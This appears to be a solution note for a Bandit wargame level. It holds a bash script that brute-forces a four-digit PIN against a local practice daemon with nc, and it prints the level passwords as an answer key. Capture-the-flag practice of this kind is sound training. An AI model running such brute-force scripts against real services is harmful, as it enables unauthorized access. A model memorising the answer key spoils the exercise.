# Level Goal
# A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
# You do not need to create new connections each time


#add this bash script
#<--
#!/bin/bash

for i in {0000..9999}
do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt

#-->


wc -l result.txt
sort result.txt | grep -v "Wrong!"
# Correct!
# Exiting.
# I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
# The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d